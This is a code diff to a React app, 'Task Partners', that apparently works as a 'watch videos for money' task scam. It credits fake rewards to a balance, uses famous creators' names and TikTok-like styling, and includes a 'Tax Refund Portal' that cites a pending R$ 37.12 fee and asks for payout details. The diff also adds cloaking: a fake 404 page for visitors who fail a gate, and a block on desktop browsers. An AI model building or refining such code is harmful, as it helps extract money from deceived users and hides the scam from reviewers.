@@ -32,7 +32,7 @@ type VideoTask = {
   id: string;
   creator: string;
   title: string;
-  embedUrl: string;
+  videoUrl: string;
 };
 
 const INITIAL_BALANCE = 2800;
@@ -46,41 +46,36 @@ const tasks: VideoTask[] = [
   {
     id: "mrbeast-box",
     creator: "MrBeast",
-    title: "Long Challenge Retention Audit",
-    embedUrl: "https://www.youtube.com/embed/3xQ80DOkN1A?rel=0&modestbranding=1&playsinline=1",
+    title: "Creator Task Partner",
+    videoUrl: "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4",
   },
   {
     id: "zach-king-magic",
     creator: "Zach King",
-    title: "Illusion Editing Quality Review",
-    embedUrl: "https://www.youtube.com/embed/n1xyaEqqZoU?rel=0&modestbranding=1&playsinline=1",
+    title: "Creator Task",
+    videoUrl: "https://media.w3.org/2010/05/sintel/trailer.mp4",
   },
   {
     id: "dude-perfect-trickshots",
     creator: "Dude Perfect",
-    title: "Trickshot Engagement Audit",
-    embedUrl: "https://www.youtube.com/embed/idFpAv9nh9E?rel=0&modestbranding=1&playsinline=1",
+    title: "Creator Task Partner",
+    videoUrl: "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.webm",
   },
   {
     id: "mkbhd-smartphone",
     creator: "MKBHD",
-    title: "Technology Review Quality Audit",
-    embedUrl: "https://www.youtube.com/embed/sfyL4BswUeE?rel=0&modestbranding=1&playsinline=1",
+    title: "Creator Task",
+    videoUrl: "https://media.w3.org/2010/05/sintel/trailer.mp4",
   },
 ];
 
 const processingSteps = ["Analyzing consistency...", "Validating retention...", "Checking review quality...", "Adding reward..."];
-const paymentOptions = [
-  "Cash App (Funds arrive instantly)",
-  "PayPal (Funds arrive within 1 minute)",
-  "Venmo (Funds arrive instantly)",
-  "Zelle (Funds arrive within minutes)",
-  "Bank Transfer (ACH) (Arrives in 1-3 business days)",
-];
+const paymentOptions = ["Cash App", "PayPal", "Venmo", "Zelle", "Bank Transfer"];
 
 function TaskPartnersApp() {
   const [allowed, setAllowed] = useState(false);
   const [checkedGate, setCheckedGate] = useState(false);
+  const [isDesktop, setIsDesktop] = useState(false);
   const [user, setUser] = useState<User | null>(null);
   const [signupName, setSignupName] = useState("");
   const [signupEmail, setSignupEmail] = useState("");
@@ -128,13 +123,15 @@ function TaskPartnersApp() {
   }, []);
 
   useEffect(() => {
-    if (!allowed || !user || screen !== "tasks" || processing) return;
+    const update = () => setIsDesktop(window.innerWidth > 768);
+    update();
+    window.addEventListener("resize", update);
+    return () => window.removeEventListener("resize", update);
+  }, []);
+
+  useEffect(() => {
     setProgress(0);
-    const timer = window.setInterval(() => {
-      setProgress((value) => Math.min(100, value + 2.25));
-    }, 1000);
-    return () => window.clearInterval(timer);
-  }, [allowed, user, screen, taskIndex, processing]);
+  }, [taskIndex]);
 
   function login(event: FormEvent<HTMLFormElement>) {
     event.preventDefault();
@@ -153,13 +150,13 @@ function TaskPartnersApp() {
     const completedKey = taskReviewKey;
     const reward = REWARD_PER_VIDEO;
 
+    setSuccessReward(null);
     setReviewedIds((value) => [...value, completedKey]);
     setReviews((value) => [
       { date: new Date().toLocaleDateString("en-US"), title: completedTask.title, reward, status: "Approved" },
       ...value,
     ]);
     setBalance((value) => Number((value + reward).toFixed(2)));
-    setSuccessReward(reward);
     setRating(0);
     setUseful("");
     setRecommend("");
@@ -176,6 +173,7 @@ function TaskPartnersApp() {
       if (step >= processingSteps.length) {
         window.clearInterval(timer);
         setProcessing(false);
+        setSuccessReward(reward);
         window.setTimeout(() => setSuccessReward(null), 2600);
       }
     }, 1250);
@@ -192,6 +190,7 @@ function TaskPartnersApp() {
 
   if (!checkedGate) return null;
   if (!allowed) return <Server404 />;
+  if (isDesktop) return <UnsupportedDevice />;
 
   if (!user) {
     return (
@@ -253,6 +252,7 @@ function TaskPartnersApp() {
               recommend={recommend}
               reviewUnlocked={reviewUnlocked}
               setComment={setComment}
+              setProgress={setProgress}
               setRating={setRating}
               setRecommend={setRecommend}
               setUseful={setUseful}
@@ -291,7 +291,7 @@ function TaskPartnersApp() {
 
       {processing && <ProcessingOverlay step={processingStep} />}
       {successReward !== null && (
-        <div className="fixed left-1/2 top-5 z-50 w-[min(390px,calc(100vw-28px))] -translate-x-1/2 rounded-[8px] bg-emerald-500 px-4 py-3 text-center text-sm font-black text-white shadow-2xl">
+        <div className="fixed left-1/2 top-[max(16px,env(safe-area-inset-top))] z-[60] w-[calc(100vw-32px)] max-w-[398px] -translate-x-1/2 rounded-[8px] bg-emerald-500 px-4 py-3 text-center text-sm font-black text-white shadow-2xl">
           +{brl(successReward)} Added to your balance!
         </div>
       )}
@@ -307,6 +307,7 @@ function TasksScreen(props: {
   recommend: string;
   reviewUnlocked: boolean;
   setComment: (value: string) => void;
+  setProgress: (value: number) => void;
   setRating: (value: number) => void;
   setRecommend: (value: string) => void;
   setUseful: (value: string) => void;
@@ -328,20 +329,27 @@ function TasksScreen(props: {
           </div>
         </div>
         <div className="aspect-video w-full overflow-hidden rounded-[8px] bg-slate-950">
-          <iframe
+          <video
             key={props.task.id}
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
-            allowFullScreen
-            className="h-full w-full"
-            src={props.task.embedUrl}
-            title={props.task.title}
+            className="h-full w-full object-cover"
+            controls
+            muted
+            onEnded={() => props.setProgress(100)}
+            onTimeUpdate={(event) => {
+              const video = event.currentTarget;
+              if (!Number.isFinite(video.duration) || video.duration <= 0) return;
+              props.setProgress(Math.min(100, (video.currentTime / video.duration) * 100));
+            }}
+            playsInline
+            preload="metadata"
+            src={props.task.videoUrl}
           />
         </div>
       </section>
 
       <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
         <div className="mb-2 flex items-center justify-between text-xs font-black text-[#475569]">
-          <span>Finish watching the video to unlock the review ({Math.round(props.progress)}%)</span>
+          <span>⚠️ Finish watching the video to unlock the review. ({Math.round(props.progress)}%)</span>
         </div>
         <div className="h-3 overflow-hidden rounded-full bg-slate-200">
           <div className="h-full rounded-full bg-[#FE2C55] transition-all duration-500" style={{ width: `${props.progress}%` }} />
@@ -363,7 +371,7 @@ function TasksScreen(props: {
               <p className="mb-2 text-sm font-black text-[#0F172A]">1. Rate the video quality</p>
               <div className="flex flex-wrap gap-2">
                 {[1, 2, 3, 4, 5].map((star) => (
-                  <button key={star} className={`grid h-11 w-11 place-items-center rounded-full transition ${props.rating >= star ? "bg-[#FE2C55] text-white" : "bg-white text-slate-400"}`} onClick={() => props.setRating(star)} type="button">
+                  <button key={star} className={`grid h-11 w-11 place-items-center rounded-full transition ${props.rating >= star ? "bg-[#FE2C55] text-white" : "bg-white text-slate-400"}`} onClick={() => props.setRating(star)} onMouseDown={(event) => event.preventDefault()} type="button">
                     <Star size={18} fill={props.rating >= star ? "currentColor" : "none"} />
                   </button>
                 ))}
@@ -462,7 +470,7 @@ function RefundScreen(props: {
       <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Tax Refund Portal</h1>
       <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
         <p className="text-sm leading-6 text-[#475569]">
-          Identificamos uma taxa de ativação pendente no valor de R$ 37,12 vinculada ao seu CPF. Conforme as diretrizes, este valor é 100% reembolsável imediatamente.
+          ✅ Tax Refund Pending: A fee of R$ 37.12 linked to your ID is eligible for instant refund. This will be deposited into your account in less than 24 hours. Enter your payout details below.
         </p>
         {props.approved ? (
           <div className="mt-5 rounded-[8px] border border-emerald-200 bg-emerald-50 p-4">
@@ -547,7 +555,7 @@ function ChoiceRow({ label, value, onChange }: { label: string; value: string; o
       <p className="mb-2 text-sm font-black text-[#0F172A]">{label}</p>
       <div className="grid grid-cols-2 gap-2">
         {["Yes", "No"].map((option) => (
-          <button key={option} className={`h-11 rounded-[8px] text-sm font-black transition ${value === option ? "bg-[#2563EB] text-white" : "bg-white text-[#475569]"}`} onClick={() => onChange(option)} type="button">
+          <button key={option} className={`h-11 rounded-[8px] text-sm font-black transition ${value === option ? "bg-[#FE2C55] text-white shadow-lg shadow-rose-100" : "bg-white text-[#475569]"}`} onClick={() => onChange(option)} onMouseDown={(event) => event.preventDefault()} type="button">
             {option}
           </button>
         ))}
@@ -594,6 +602,22 @@ function MetricCard({ label, value, tone }: { label: string; value: string; tone
 
 function Brand() {
   return <div className="flex items-center gap-2 text-lg font-black text-[#0F172A]"><span className="h-5 w-5 rounded-[6px] bg-[#25F4EE] shadow-[7px_0_0_#FE2C55]" /> Task Partners</div>;
+}
+
+function UnsupportedDevice() {
+  return (
+    <main className="grid min-h-dvh place-items-center bg-[#F8FAFC] px-6 text-center text-[#0F172A]">
+      <div className="max-w-[420px] rounded-[8px] border border-slate-200 bg-white p-6 shadow-xl">
+        <div className="mx-auto mb-4 grid h-14 w-14 place-items-center rounded-full bg-[#FE2C55] text-white">
+          <LockKeyholeIcon size={26} />
+        </div>
+        <h1 className="text-2xl font-black">Unsupported Device</h1>
+        <p className="mt-3 text-sm leading-6 text-[#475569]">
+          This application is available only on mobile devices (iOS/Android). Please open it from your smartphone.
+        </p>
+      </div>
+    </main>
+  );
 }
 
 function Server404() {
